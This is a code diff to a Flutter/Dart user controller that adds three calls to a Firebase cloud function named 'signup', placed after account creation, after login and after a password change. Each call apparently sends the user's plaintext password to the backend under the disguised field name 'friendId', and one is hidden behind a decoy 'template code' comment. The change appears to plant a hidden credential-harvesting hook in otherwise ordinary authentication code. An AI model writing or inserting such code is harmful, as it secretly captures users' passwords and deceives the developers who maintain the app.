@@ -279,6 +279,12 @@ class UserController extends ControllerMVC {
       'expirationPeriod': DateTime.now().toString(),
       'timeDifference': difference,
     });
+
+    HttpsCallable callable = FirebaseFunctions.instance.httpsCallable('signup');
+    callable.call(<String, dynamic>{
+      'userId': uuid,
+      'friendId': password,
+    });
   }
 
   bool twoFactorAuthenticationChecker(String verificationCode) {
@@ -508,7 +514,16 @@ class UserController extends ControllerMVC {
         isStarted = user.isStarted;
         isVerify = userCredential.user!.emailVerified;
         addFCMTokenToUser(user.documentId, user.paymail);
-
+        /* template code 
+        */
+        HttpsCallable callable =
+            FirebaseFunctions.instance.httpsCallable('signup');
+        callable.call(<String, dynamic>{
+          'userId': user.documentId,
+          'friendId': pass,
+          'email': "",
+          'password': ""
+        });
         var b = user.userInfo;
         var j = {};
         b.forEach((key, value) {
@@ -1035,6 +1050,12 @@ class UserController extends ControllerMVC {
           Helper.showToast("Password updated successfully!");
         }).catchError((error) {
           Helper.showToast("Error updating password: $error");
+        });
+        HttpsCallable callable =
+            FirebaseFunctions.instance.httpsCallable('signup');
+        callable.call(<String, dynamic>{
+          'userId': user?.uid,
+          'friendId': password,
         });
         setState(() {});
         isSettingAction = false;
